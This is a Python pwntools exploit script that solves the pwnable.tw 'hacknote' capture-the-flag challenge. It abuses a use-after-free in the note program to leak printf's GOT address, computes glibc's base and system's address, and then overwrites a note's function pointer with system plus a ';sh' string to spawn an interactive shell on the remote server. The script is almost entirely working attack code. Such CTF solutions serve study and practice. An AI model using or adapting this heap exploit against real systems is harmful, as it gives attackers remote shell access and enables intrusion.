#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

from pwn import *

context.update(arch="i386", os="linux")
context.log_level = "debug"

host = "127.0.0.1"
port = 8888
host = "chall.pwnable.tw"
port = 10102
r = remote(host, port)

def add_note(size, content):
    r.sendline('1')
    r.recvuntil('Note size :')
    r.sendline(str(size))
    r.recvuntil('Content :')
    r.send(content)
    return r.recvuntil(':')

def delete_note(index):
    r.sendline('2')
    r.recvuntil('Index :')
    r.sendline(str(index))
    return r.recvuntil(':')

def print_note(index):
    r.sendline('3')
    r.recvuntil('Index :')
    r.sendline(str(index))
    return r.recvuntil(':')

def exit_note():
    r.sendline('4')
    r.close()

input("attach in gdb and press Enter")

r.recvuntil(":")

# leak bk
#add_note(0x80, "A" * 0x80)
#add_note(0x80, "B" * 0x80)
#delete_note(0)
#add_note(0x80, "EXPL")
#print_note(2)

# leak got
add_note(0x20, "A" * 0x20)
add_note(0x20, "B" * 0x20)
delete_note(0)
delete_note(1)
print_sub_func = 0x0804862B
printf_got = 0x0804a010
payload = flat([print_sub_func, printf_got])
add_note(8, payload)
printf_address = u32(print_note(0)[:4])
glibc_base = printf_address - 0x49020
system_address = glibc_base + 0x3a940
#system_address = glibc_base + 0x3a750 # local
log.info("printf address: " + hex(printf_address))
log.info("system address: " + hex(system_address))

# system("/bin/sh")
delete_note(2)
payload = flat([system_address, ";sh\x00"])
add_note(8, payload)
r.sendline('3')
r.recvuntil('Index :')
r.sendline(str(0))

r.interactive()

